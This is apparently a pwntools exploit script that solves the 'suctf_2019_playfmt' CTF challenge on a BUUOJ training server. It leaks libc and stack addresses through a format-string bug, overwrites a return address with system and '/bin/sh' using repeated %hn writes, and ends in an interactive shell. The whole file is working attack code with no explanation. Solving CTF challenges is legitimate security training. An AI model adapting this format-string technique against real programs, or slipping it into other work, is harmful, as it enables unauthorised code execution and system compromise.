from pwn import *

context.log_level = 'debug'

#p = process('./suctf_2019_playfmt')
p = remote('node4.buuoj.cn', 25042)

libc = ELF('libc-2.27.buu.so')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/32/libc-2.27.debug.so
    ''' + s)

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)


sla(b'r\n=====================\n', b'%23$p,,,%6$p')

libc_base = int(rv(10), 16) - libc.sym['__libc_start_main'] - 241
success('libc_base -> {}'.format(hex(libc_base)))

ru(b',,,')
esp = int(rv(10), 16) - ( 0xffc293d8 - 0xffc293a0 ) 
success('esp -> {}'.format(hex(esp)))

ebp = esp + 0x18
ret_addr = ebp + 0x4

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

success('system -> {}'.format(hex(system)))

payload = '%' + str(ret_addr & 0xffff) + 'c%6$hnqwq'
sn(payload.encode())
ru(b'qwq')

payload = '%' + str(system & 0xffff) + 'c%14$hnqwq'
sn(payload.encode())
ru(b'qwq')

payload = '%' + str((ret_addr + 2) & 0xffff) + 'c%6$hnqwq'
sn(payload.encode())
ru(b'qwq')

payload = '%' + str((system >> 16) & 0xffff) + 'c%14$hnqwq'
sn(payload.encode())
ru(b'qwq')


payload = '%' + str((ret_addr + 8) & 0xffff) + 'c%6$hnqwq'
sn(payload.encode())
ru(b'qwq')

payload = '%' + str(bin_sh & 0xffff) + 'c%14$hnqwq'
sn(payload.encode())
ru(b'qwq')

payload = '%' + str((ret_addr + 10) & 0xffff) + 'c%6$hnqwq'
sn(payload.encode())
ru(b'qwq')

#debug('b *0x804889f')
payload = '%' + str((bin_sh >> 16) & 0xffff) + 'c%14$hnqwq'
sn(payload.encode())
ru(b'qwq')

payload = b'quit\x00'
sn(payload)

p.interactive()